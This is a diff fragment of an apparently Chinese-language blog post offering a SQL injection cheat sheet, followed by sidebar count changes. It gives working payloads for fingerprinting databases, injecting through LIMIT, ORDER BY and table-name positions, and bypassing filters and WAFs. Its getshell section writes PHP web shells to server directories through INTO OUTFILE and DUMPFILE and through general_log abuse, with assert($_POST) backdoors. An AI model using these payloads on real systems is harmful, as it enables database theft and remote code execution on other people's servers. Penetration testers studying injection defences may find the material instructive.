+<p>  sysdatabases: 存储了所有的数据库，sysobjects存储了所有的数据库表。<code>select * from master.dbo.sysdatabases</code>就可以查询出所有的库名。 </p>
+<p>  Sysobjects：SQL-SERVER的每个数据库内都有此系统表，它存放该数据库内创建的所有对象，如约束、默认值、日志、规则、存储过程等，每个对象在表中占一行。</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (select count(*) from )&gt;0 and 1=1</span><br></pre></td></tr></table></figure>
+<p>  syscolumns：每个表和视图中的每列在表中占一行，存储过程中的每个参数在表中也占一行。该表位于每个数据库中。主要字段有：</p>
+<ul>
+<li>系统变量</li>
+</ul>
+<p>  SQL－SERVER有user,db_name(),@@VERSION等系统变量，利用这些系统值不仅可以判断SQL-SERVER，而且还可以得到大量有用信息。(无version()函数)</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abc.asp?p=YY and user&gt;0 不仅可以判断是否是SQL-SERVER，而还可以得到当前连接到数据库的用户名</span><br><span class="line"></span><br><span class="line">abc.asp?p=YY&amp;n ... db_name()&gt;0 不仅可以判断是否是SQL-SERVER，而还可以得到当前正在使用的数据库名；</span><br></pre></td></tr></table></figure></li>
+<li><p>Mysql:</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and (select count(*) from information_schema.TABLES)&gt;0 and 1=1--+</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="3-通过各数据库特有的连接符判断数据库类型"><a href="#3-通过各数据库特有的连接符判断数据库类型" class="headerlink" title="3. 通过各数据库特有的连接符判断数据库类型"></a>3. 通过各数据库特有的连接符判断数据库类型</h3><ol>
+<li><p>mssql数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1 and &#x27;1&#x27; + &#x27;1&#x27; = &#x27;11&#x27;</span><br></pre></td></tr></table></figure></li>
+<li><p>mysql数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1 and &#x27;1&#x27; + &#x27;1&#x27; = &#x27;2&#x27;</span><br><span class="line">http://127.0.0.1/test.php?id=1 and CONCAT(&#x27;1&#x27;,&#x27;1&#x27;)=&#x27;11&#x27;</span><br></pre></td></tr></table></figure></li>
+<li><p>oracle数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1 and &#x27;1&#x27;||&#x27;1&#x27;=&#x27;11&#x27;</span><br><span class="line">http://127.0.0.1/test.php?id=1 and CONCAT(&#x27;1&#x27;,&#x27;1&#x27;)=&#x27;11&#x27;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="0x03-注入位置"><a href="#0x03-注入位置" class="headerlink" title="0x03 注入位置"></a>0x03 注入位置</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tables where id=[子查询] order by [子查询, PROCEDURE ANALYSE] limit [PROCEDURE ANALYSE, INTO...LINES TERMINATED BY]</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-limit注入"><a href="#1-limit注入" class="headerlink" title="1. limit注入"></a>1. limit注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sql = &quot;SELECT id FROM test WHERE id &gt; 0 ORDER BY id LIMIT &quot;.$_GET[&#x27;num&#x27;];</span><br></pre></td></tr></table></figure>
+
+<p>limit注入分有无<code>order by</code>. 若无<code>order by</code>可以使用union select，存在<code>order by</code>可以使用<code>procedure analyse()</code>报错注入和<code>into outfile &#39;&#39; lines terminated by</code>写文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=1 into outfile &#x27;D:\\phpstudy_pro\\WWW\\test123.php&#x27; LINES TERMINATED BY 0x3C3F7068702061737365727428245F504F53545B70765D293B3F3E</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>procedure analysis此方法只适用于小于5.6.6的5.x系列。into 需要有file权限</p>
+</blockquote>
+<h3 id="2-order-by注入"><a href="#2-order-by注入" class="headerlink" title="2. order by注入"></a>2. order by注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sql = &quot;select * from test order by &quot;.$_GET[&#x27;order&#x27;];</span><br></pre></td></tr></table></figure>
+<p>order by后可直接跟子查询</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">order=updatexml(1,concat(0x3a,user(),0x3a),1)</span><br><span class="line">order=updatexml(1,concat(0x3a,(select id from test limit 1),0x3a),1)</span><br><span class="line">extractvalue(1,concat(0x3a,user(),0x3a))</span><br></pre></td></tr></table></figure>
+<h3 id="3-表名注入"><a href="#3-表名注入" class="headerlink" title="3. 表名注入"></a>3. 表名注入</h3><p><code>show columns from $table</code>show的语法如下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SHOW [FULL] COLUMNS &#123;FROM | IN&#125; tbl_name [&#123;FROM | IN&#125; db_name]</span><br><span class="line">[LIKE &#x27;pattern&#x27; | WHERE expr]</span><br></pre></td></tr></table></figure>
+<p>后面可以直接跟where子查询：<code>SHOW COLUMNS FROM </code>test<code> WHERE UPDATEXML(1,user(),1);</code></p>
+<p>还有<code>describe $table</code>, <code>update $table</code>等。</p>
+<h2 id="0x04-绕过"><a href="#0x04-绕过" class="headerlink" title="0x04 绕过"></a>0x04 绕过</h2><h3 id="1-替换逗号"><a href="#1-替换逗号" class="headerlink" title="1. 替换逗号"></a>1. 替换逗号</h3><ol>
+<li><p>substring from…for</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ascii(mid(user(),1,2)) -&gt; select ascii(substring(user() from 1 for 1))</span><br></pre></td></tr></table></figure></li>
+<li><p><code>like &#39;a%&#39;</code> 成功再测试 <code>like &#39;aa%&#39;</code>、 <code>like &#39;ab%&#39;</code> … <code>like &#39;az%&#39;</code> 直到第二个字符正确，再测试第三个。</p>
+</li>
+<li><p><code>select user() regexp &#39;^a&#39;</code></p>
+</li>
+</ol>
+<h3 id="2-符号替换"><a href="#2-符号替换" class="headerlink" title="2. 符号替换"></a>2. 符号替换</h3><p><img src="./sql_waf_bypass.jpg" alt="image"></p>
+<h3 id="3-sqlmap-tamper"><a href="#3-sqlmap-tamper" class="headerlink" title="3. sqlmap tamper"></a>3. sqlmap tamper</h3><blockquote>
+<p>过waf tamper相关<br><br>与burp联合，sqlmap4burp，gason，sqlipy</p>
+</blockquote>
+<h2 id="0x05-getshell"><a href="#0x05-getshell" class="headerlink" title="0x05 getshell"></a>0x05 getshell</h2><h3 id="1-注入写shell"><a href="#1-注入写shell" class="headerlink" title="1. 注入写shell"></a>1. 注入写shell</h3><p>mysql的secure_file_priv参数限制了的导入导出的文件权限，只能将文件导入或导出到指定位置（一般不能导出到web目录）。</p>
+<p>这个参数不能动态更改，只能在mysql的配置文件中进行修改，然后重启生效。</p>
+<blockquote>
+<p>show variables like ‘%secure%’. 其中当参数 secure_file_priv 为空时，对导入导出无限制<br><br>当值为一个指定的目录时，只能向指定的目录导入导出<br><br>当值被设置为NULL时，禁止导入导出功能</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select &#x27;&lt;?phpinfo();?&gt;&#x27; into dumpfile &#x27;D:\\test.php&#x27;;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">注入payload：</span><br><span class="line">id=1&#x27; union select 1,&#x27;123&#x27; into dumpfile &#x27;D:/xxx/xxx/shell.php&#x27;-- -</span><br></pre></td></tr></table></figure>
+<ul>
+<li>dumpfile/outfile/load_file区别参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zztac/p/11371149.html">dumpfile/outfile/load_file</a></li>
+</ul>
+<h3 id="2-日志写shell"><a href="#2-日志写shell" class="headerlink" title="2. 日志写shell"></a>2. 日志写shell</h3><p>general_log</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=&#x27;on&#x27;;</span><br><span class="line"></span><br><span class="line">SET global general_log_file=&#x27;E:/UPUPW_AP5.6-1510/UPUPW_AP5.6/htdocs/classes.php&#x27;; </span><br><span class="line"></span><br><span class="line">SELECT &#x27;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&#x27;;</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
   </section>
 
   
@@ -1210,7 +1785,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">7</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -1221,7 +1796,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">4</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
@@ -1232,7 +1807,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-count">10</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
